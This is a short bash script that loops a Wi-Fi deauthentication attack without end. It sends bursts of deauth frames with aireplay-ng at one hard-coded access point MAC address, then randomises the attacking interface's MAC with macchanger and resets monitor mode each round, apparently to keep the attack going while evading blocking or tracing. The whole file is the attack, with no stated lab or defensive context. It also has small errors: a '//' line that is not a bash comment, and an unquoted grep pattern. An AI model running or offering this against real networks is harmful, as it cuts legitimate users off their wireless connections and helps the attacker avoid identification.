#! /usr/bin/bash
//macchanger --help
while true
do
    aireplay-ng -0 11 -a 78:17:35:3B:BE:A9 wlp2s0
    ifconfig wlp2s0 down
    macchanger -r wlp2s0 | grep New MAC
    iwconfig wlp2s0 mode monitor
    ifconfig wlp2s0 up
    sleep 5
done    

